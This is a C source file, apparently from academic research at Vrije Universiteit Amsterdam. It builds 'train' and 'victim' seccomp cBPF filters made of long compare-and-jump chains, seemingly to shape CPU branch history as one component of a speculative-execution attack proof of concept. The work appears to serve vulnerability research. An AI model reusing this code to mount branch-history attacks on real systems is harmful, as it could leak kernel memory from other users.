/*
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */


#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <assert.h>
#include <stddef.h>

#include "targets.h"

#define LO_ARG(idx) offsetof(struct seccomp_data, args[(idx)])
#define HI_ARG(idx) offsetof(struct seccomp_data, args[(idx)]) + sizeof(__u32)


#define syscall_nr (offsetof(struct seccomp_data, nr))

struct sock_filter filter[BPF_MAXINSNS] = {0};

struct sock_fprog prog = {
    .filter = filter,
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
};


//  Resulting compare snippet:
//  and    eax, '1 << bit'
//  cmp    rax, '1 << bit'
//  je     +2
//  mov    rax, r13

static int add_inner_compare_chain(int ins_idx) {

    for (size_t bit = 0; bit < 32; bit++)
    {
        // AND with bit
        int k = 1 << bit;
        filter[ins_idx] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_AND, 0);
        filter[ins_idx++].k = k;

        // compare and jump
        filter[ins_idx] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0, 0, 0);
        filter[ins_idx++].k = k;

        // RESTORE A FROM X
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TXA, 0);
    }

    assert(ins_idx < 4096);
    return ins_idx;

}

static void create_filter_train() {

    int ins_idx = 0;

    // short path: not our victim syscall
    filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);

    filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_select, 1, 0);
	filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW); // quick exit for other syscalls


     // quick exit for training syscall, without magic
#ifndef INTEL_LION_COVE
    filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, LO_ARG(4));

    // compare and jump
    filter[ins_idx] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0, 0, 1);
    filter[ins_idx++].k = 0x0;

    // exit
    filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);
#endif

    for (int arg_nr = 0; arg_nr < 4; arg_nr++)
    {
        // LOAD LO ARG
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, LO_ARG(5));
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);

        ins_idx = add_inner_compare_chain(ins_idx);

        // // LOAD HIGH ARG
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, HI_ARG(5));
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);

        ins_idx = add_inner_compare_chain(ins_idx);

    }

    filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    prog.filter = filter;
    prog.len = ins_idx;

    printf("Total number of BPF instructions for train: %d\n", ins_idx);

}

static void create_filter_victim(){

    int ins_idx = 0;

    // short path: not our victim syscall
    filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);

    // quick exit for other syscalls
    filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, 1, 0);
	filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);


    int rand_arg_numbers[] = {0, 4, 5};

    // We don't really need 64 * 6 branches for <=11th gen, but it makes it
    // compatible for newer generations
    for (int arg_nr = 0; arg_nr < 6; arg_nr++)
    {
        // LOAD LO ARG
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, LO_ARG(rand_arg_numbers[arg_nr % 3]));
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);

        ins_idx = add_inner_compare_chain(ins_idx);

        // LOAD HIGH ARG
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, HI_ARG(rand_arg_numbers[arg_nr % 3]));
        filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);

        ins_idx = add_inner_compare_chain(ins_idx);

    }


    filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    prog.filter = filter;
    prog.len = ins_idx;

    printf("Total number of BPF instructions for victim: %d\n", ins_idx);

}


int add_seccomp_history_filter()
{


	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)");
		return 1;
	}

    create_filter_victim();

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
		perror("prctl(SECCOMP)");
		return 1;
	}

    create_filter_train();

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
		perror("prctl(SECCOMP)");
		return 1;
	}

    printf("cBPF succesfully created!\n");

    return 0;

}
